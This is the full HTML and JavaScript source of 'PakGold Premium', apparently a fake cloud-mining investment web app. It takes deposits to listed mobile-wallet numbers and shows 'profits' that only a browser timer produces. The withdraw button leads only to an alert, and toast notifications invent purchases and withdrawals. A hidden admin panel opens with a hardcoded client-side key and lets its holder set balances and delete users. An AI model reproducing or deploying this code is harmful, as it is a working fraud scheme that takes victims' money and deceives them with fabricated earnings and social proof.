<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PakGold Premium | v4.0 Final</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database-compat.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <style>
        :root { --gold: #d4af37; --gold-dark: #b8860b; --bg: #f8fafc; --dark: #0f172a; --white: #ffffff; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: var(--dark); overflow-x: hidden; }

        /* Smooth Transitions & Animations */
        .page { display: none; min-height: 100vh; padding-bottom: 110px; animation: fadeIn 0.6s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* Premium UI Components */
        .glass-header { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); color: white; padding: 45px 25px 35px; border-radius: 0 0 45px 45px; position: relative; overflow: hidden; border-bottom: 4px solid var(--gold); }
        .glass-header::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(212,175,55,0.1) 0%, transparent 60%); }
        
        .bal-card { background: var(--white); margin: -30px 20px 20px; padding: 25px; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.05); border: 1px solid #f1f5f9; display: flex; flex-direction: column; align-items: center; }
        .profit-text { font-size: 2.2rem; font-weight: 900; color: var(--gold-dark); letter-spacing: -1px; }

        /* 15+5 Plans Grid */
        .section-title { padding: 0 25px; margin: 25px 0 15px; font-weight: 900; display: flex; align-items: center; justify-content: space-between; }
        .plans-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 20px; }
        .plan-card { background: white; padding: 20px; border-radius: 25px; border: 1px solid #e2e8f0; position: relative; transition: 0.3s; overflow: hidden; }
        .plan-card:active { transform: scale(0.95); background: #fffdf5; }
        .vip-card { border: 2px solid var(--gold); background: linear-gradient(to bottom right, #fff, #fff9e6); }
        .badge { position: absolute; top: 10px; right: 10px; background: var(--gold); color: black; font-size: 0.5rem; font-weight: 900; padding: 3px 7px; border-radius: 50px; }

        /* Forms & Buttons */
        .input-group { background: white; margin: 20px; padding: 25px; border-radius: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.02); }
        input, select { width: 100%; padding: 16px; margin: 10px 0; border-radius: 18px; border: 1px solid #e2e8f0; outline: none; font-size: 0.95rem; }
        .btn-premium { background: var(--dark); color: white; border: none; padding: 18px; width: 100%; border-radius: 20px; font-weight: 900; text-transform: uppercase; cursor: pointer; box-shadow: 0 10px 25px rgba(0,0,0,0.15); transition: 0.3s; }
        .btn-gold { background: var(--gold-dark); box-shadow: 0 10px 20px rgba(184, 134, 11, 0.3); }

        /* Admin / God Eye Styles */
        .god-panel { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; border-radius: 20px; margin: 10px; border: 1px solid #333; }
        .user-stat { border-bottom: 1px solid #333; padding: 10px 0; font-size: 0.8rem; }

        /* Floating Nav */
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.9); backdrop-filter: blur(15px); display: flex; justify-content: space-around; padding: 18px; border-top: 1px solid #eee; border-radius: 35px 35px 0 0; z-index: 9999; }
        .nav-item { text-align: center; font-size: 0.7rem; color: #94a3b8; font-weight: 700; cursor: pointer; }
        .nav-item.active { color: var(--gold-dark); }
        
        /* Live Toast */
        #toast { position: fixed; bottom: 100px; left: 20px; right: 20px; background: var(--dark); color: white; padding: 12px 20px; border-radius: 20px; font-size: 0.75rem; display: none; z-index: 10000; box-shadow: 0 15px 30px rgba(0,0,0,0.2); }
    </style>
</head>
<body onload="initApp()">

    <div id="toast" class="animate__animated animate__fadeInUp">User 0321*** just bought VIP Server 🚀</div>

    <!-- LOGIN / REGISTER -->
    <section id="login" class="page active">
        <div style="height:100vh; display:flex; flex-direction:column; justify-content:center; padding:40px; text-align:center;">
            <div class="animate__animated animate__zoomIn"><h1 style="font-size:4rem;">⚜️</h1></div>
            <h1 style="font-weight:900; letter-spacing:-1px; margin-top:10px;">PAK GOLD <span style="color:var(--gold)">PREMIUM</span></h1>
            <p style="color:#64748b; font-size:0.8rem; margin-bottom:35px;">Cloud Mining & Asset Management</p>
            <div class="input-group">
                <input type="number" id="ph" placeholder="Mobile Number">
                <input type="password" id="key" placeholder="God Key (Admin Only)">
                <button class="btn-premium" onclick="handleAuth()">Enter Dashboard 💋</button>
            </div>
        </div>
    </section>

    <!-- USER DASHBOARD -->
    <section id="home" class="page">
        <div class="glass-header">
            <h4 style="opacity:0.7; font-size:0.7rem;">ACCOUNT STATUS: VERIFIED ✅</h4>
            <div style="margin-top:10px; display:flex; justify-content:space-between; align-items:flex-end;">
                <div><small>CURRENT MINING</small><h2 id="u-plan">Free Node</h2></div>
                <div style="text-align:right;"><small>WALLET</small><h3 id="u-wal">Rs 0</h3></div>
            </div>
        </div>
        <div class="bal-card">
            <small style="font-weight:800; color:#94a3b8; letter-spacing:1px;">TOTAL CLOUD PROFIT</small>
            <div class="profit-text" id="u-pro">Rs 0.0000</div>
            <div style="background:#f0fdf4; color:#16a34a; padding:5px 15px; border-radius:50px; font-size:0.6rem; font-weight:800; margin-top:10px;">LIVE MINING ACTIVE</div>
        </div>

        <div class="section-title"><h3>STANDARD NODES</h3><span class="badge" style="position:relative; top:0; right:0;">15 PLANS</span></div>
        <div class="plans-grid" id="std-plans"></div>

        <div class="section-title"><h3>VIP GOD-EYE SERVERS</h3><span class="badge" style="position:relative; top:0; right:0; background:var(--dark); color:white;">5 PREMIUM</span></div>
        <div class="plans-grid" id="vip-plans" style="grid-template-columns: 1fr;"></div>
    </section>

    <!-- DEPOSIT -->
    <section id="deposit" class="page">
        <div class="glass-header"><h2>Deposit Assets</h2></div>
        <div class="input-group">
            <div style="background:#fffbeb; padding:15px; border-radius:15px; margin-bottom:20px; font-size:0.8rem; border:1px solid #fde68a;">
                <b>JAZZCASH/SADA:</b> 03705519562<br><b>EASYPAISA:</b> 03379827882
            </div>
            <input type="number" id="d-amt" placeholder="Enter Amount (Min 500)">
            <input type="text" id="d-tid" placeholder="Transaction ID (TID)">
            <button class="btn-premium btn-gold" onclick="sendDep()">Submit for Approval</button>
        </div>
    </section>

    <!-- GOD MODE ADMIN -->
    <section id="admin" class="page" style="background:#000;">
        <div style="padding:25px; color:#00ff00;">
            <h3>[ GOD-EYE TERMINAL v4.0 ]</h3>
            <div class="god-panel" id="admin-stats">Total Assets: Loading...</div>
            
            <h4 style="margin:20px 0 10px;">PENDING TRANSACTIONS</h4>
            <div id="admin-deps"></div>

            <h4 style="margin:20px 0 10px;">USER DATABASE</h4>
            <div id="admin-users"></div>

            <h4 style="margin:20px 0 10px;">MANUAL OVERRIDE</h4>
            <div class="god-panel">
                <input type="text" id="g-ph" placeholder="Target Phone" style="background:#111; color:#0f0; border:1px solid #333;">
                <input type="number" id="g-wal" placeholder="Set Wallet" style="background:#111; color:#0f0; border:1px solid #333;">
                <button class="btn-premium" style="background:#0f0; color:#000;" onclick="godExecute()">EXECUTE OVERRIDE</button>
            </div>
        </div>
    </section>

    <!-- NAV BAR -->
    <nav class="nav-bar" id="nb" style="display:none;">
        <div class="nav-item active" onclick="nav('home')">🏠<br>Home</div>
        <div class="nav-item" onclick="nav('deposit')">💰<br>Deposit</div>
        <div class="nav-item" onclick="alert('Withdrawals open 10AM-4PM')">💸<br>Withdraw</div>
        <div class="nav-item" onclick="location.reload()">🔄<br>Sync</div>
    </nav>

    <script>
        // --- SECURE FIREBASE CONFIG ---
        const firebaseConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 15 Standard Plans
        const stdPlans = [];
        for(let i=1; i<=15; i++) {
            stdPlans.push({ n: `Node-X${i}`, p: 500 * i, s: (0.0004 * i).toFixed(5) });
        }

        // 5 VIP Plans
        const vipPlans = [
            { n: "TITAN SERVER", p: 50000, s: 0.1250 },
            { n: "GOD-EYE NODE", p: 100000, s: 0.3000 },
            { n: "ELITE CLUSTER", p: 250000, s: 0.8500 },
            { n: "CYBER CORE", p: 500000, s: 2.1000 },
            { n: "PAK-GOLD MAIN-FRAME", p: 1000000, s: 5.5000 }
        ];

        let currentUser = localStorage.getItem('up_ph');

        function initApp() {
            if(currentUser) { nav('home'); startSystem(); }
            renderUI();
            startToasts();
        }

        function handleAuth() {
            let p = document.getElementById('ph').value;
            let k = document.getElementById('key').value;
            if(k === "pakgold786") return nav('admin'), loadAdmin();
            if(p.length < 10) return alert("Valid number please! 💋");
            currentUser = p;
            localStorage.setItem('up_ph', p);
            db.ref('users/' + p).once('value', s => {
                if(!s.exists()) db.ref('users/' + p).set({ wallet: 0, profit: 0, speed: 0, plan: 'Free Node' });
                location.reload();
            });
        }

        function startSystem() {
            db.ref('users/' + currentUser).on('value', s => {
                let d = s.val();
                document.getElementById('u-wal').innerText = "Rs " + d.wallet;
                document.getElementById('u-pro').innerText = "Rs " + parseFloat(d.profit).toFixed(4);
                document.getElementById('u-plan').innerText = d.plan;
            });

            setInterval(() => {
                db.ref('users/' + currentUser).once('value', s => {
                    let d = s.val();
                    if(d.speed > 0) db.ref('users/' + currentUser).update({ profit: (parseFloat(d.profit) + parseFloat(d.speed)).toFixed(4) });
                });
            }, 1000);
        }

        function renderUI() {
            let std = document.getElementById('std-plans');
            stdPlans.forEach(p => {
                std.innerHTML += `<div class="plan-card" onclick="buyPlan(${p.p}, ${p.s}, '${p.n}')">
                    <small>PLAN</small><h4 style="margin:5px 0;">${p.n}</h4>
                    <b style="color:var(--gold-dark)">Rs ${p.p}</b><br><small>Speed: ${p.s}/s</small>
                </div>`;
            });

            let vip = document.getElementById('vip-plans');
            vipPlans.forEach(p => {
                vip.innerHTML += `<div class="plan-card vip-card" onclick="buyPlan(${p.p}, ${p.s}, '${p.n}')">
                    <div class="badge">VIP</div>
                    <small>PREMIUM SERVER</small><h3>${p.n}</h3>
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
                        <b style="color:var(--gold-dark); font-size:1.2rem;">Rs ${p.p}</b>
                        <small>Speed: ${p.s}/sec</small>
                    </div>
                </div>`;
            });
        }

        function buyPlan(p, s, n) {
            db.ref('users/' + currentUser).once('value', d => {
                let u = d.val();
                if(u.wallet < p) return alert("Wallet Empty, sweetie! 💋");
                db.ref('users/' + currentUser).update({ wallet: u.wallet - p, speed: s, plan: n });
                alert(n + " Activated Successfully! 🚀");
            });
        }

        function sendDep() {
            let a = document.getElementById('d-amt').value;
            let t = document.getElementById('d-tid').value;
            if(!a || !t) return alert("Fill all fields!");
            db.ref('deposits/').push({ user: currentUser, amt: a, tid: t, status: 'pending' });
            alert("Sent to God-Eye! 💋");
            nav('home');
        }

        // --- GOD EYE TERMINAL ---
        function loadAdmin() {
            db.ref('users/').on('value', s => {
                let uCont = document.getElementById('admin-users');
                uCont.innerHTML = "";
                s.forEach(child => {
                    let u = child.val();
                    uCont.innerHTML += `<div class="user-stat"><b>${child.key}</b> | Wal: ${u.wallet} | Spd: ${u.speed} <button onclick="delUser('${child.key}')" style="background:red; color:white; border:none; padding:2px 5px; float:right;">DEL</button></div>`;
                });
            });

            db.ref('deposits/').on('value', s => {
                let dCont = document.getElementById('admin-deps');
                dCont.innerHTML = "";
                s.forEach(child => {
                    let d = child.val();
                    if(d.status === 'pending') {
                        dCont.innerHTML += `<div class="god-panel">User: ${d.user} | Rs: ${d.amt} | TID: ${d.tid} <br> <button onclick="godApprove('${child.key}','${d.user}',${d.amt})" style="background:#0f0; border:none; padding:5px; margin-top:5px; width:100%;">APPROVE ✅</button></div>`;
                    }
                });
            });
        }

        function godApprove(key, ph, amt) {
            db.ref('users/' + ph).once('value', s => {
                db.ref('users/' + ph).update({ wallet: s.val().wallet + parseInt(amt) });
                db.ref('deposits/' + key).remove();
            });
        }

        function godExecute() {
            let ph = document.getElementById('g-ph').value;
            let wal = document.getElementById('g-wal').value;
            db.ref('users/' + ph).update({ wallet: parseInt(wal) });
            alert("OVERRIDDEN 💋");
        }

        function delUser(ph) { if(confirm("Destroy user?")) db.ref('users/' + ph).remove(); }

        function startToasts() {
            const msgs = ["just bought Titan Server", "withdrew Rs 45,000", "activated Cyber Core", "added Rs 10,000 to liquidity"];
            setInterval(() => {
                let t = document.getElementById('toast');
                t.innerText = "User 03" + Math.floor(Math.random()*99) + "*** " + msgs[Math.floor(Math.random()*msgs.length)] + "! 💰";
                t.style.display = "block";
                setTimeout(() => t.style.display = "none", 4000);
            }, 8000);
        }

        function nav(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('nb').style.display = (id === 'login' || id === 'admin') ? 'none' : 'flex';
        }
    </script>
</body>
</html>
